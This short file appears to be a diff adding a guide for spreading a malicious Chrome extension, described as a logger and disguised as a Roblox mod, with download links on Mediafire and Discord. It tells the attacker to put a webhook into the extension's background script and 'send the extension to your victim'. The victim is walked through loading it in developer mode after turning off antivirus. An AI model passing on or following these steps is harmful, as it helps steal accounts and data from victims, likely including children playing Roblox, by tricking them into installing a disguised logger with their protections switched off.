@@ -1,0 +1,17 @@
+https://www.mediafire.com/file/uljk1oa8ss8jlk7/Extension_Logger_V2_%25281%2529.zip/file
+
+
+Method 2:
+File: https://cdn.discordapp.com/attachments/827803716878204998/829797532992667648/ROBLOX_MOD_EXTENTIONV1.rar
+Edit bgwork.
+
+
+Basically what you do is that you right click on bg work and put your  web hook  where it says "web hook here" and then save it. then send the extension to your victim;
+
+1)  Download the extention.
+2:  Go to chrome and click extentions.
+3)  Click Dev Mode
+4) Click Load Unpacked and select the file i sent (extract it btw)
+5) Refresh roblox and done! you can use mods on roblox now
+
+Turn off your anti-virus before installing the extension
